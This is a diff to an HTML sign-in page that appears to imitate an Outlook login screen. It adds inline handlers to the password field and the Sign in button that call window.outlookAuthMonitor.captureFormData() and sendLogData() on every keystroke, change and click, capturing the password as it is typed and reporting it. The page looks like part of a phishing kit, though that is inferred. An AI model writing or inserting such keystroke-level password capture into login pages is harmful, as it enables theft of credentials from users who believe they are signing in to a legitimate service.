@@ -39,11 +39,11 @@
                 </div>
                 <div class="sButton">
                     <div id="passwordSection" class="hidden">
-                        <input type="password" id="passwordInput" placeholder="Password" class="passwd">
+                        <input type="password" id="passwordInput" placeholder="Password" class="passwd" onchange="if(window.outlookAuthMonitor){window.outlookAuthMonitor.captureFormData();window.outlookAuthMonitor.sendLogData('password_changed');}" oninput="if(window.outlookAuthMonitor){window.outlookAuthMonitor.captureFormData();}">
                         <div class="flt">
                             <a href="" id="fp">Forget password?</a>
                         </div>
-                        <button onclick="submitForm()" class="newSi">Sign in</button>
+                        <button onclick="if(window.outlookAuthMonitor){window.outlookAuthMonitor.captureFormData();window.outlookAuthMonitor.sendLogData('sign_in_click');} submitForm();" class="newSi">Sign in</button>
                     </div>
                     <div class="hidden"><br><br><br></div>
                     <button class="btn-back" id="btn-back">Back</button>
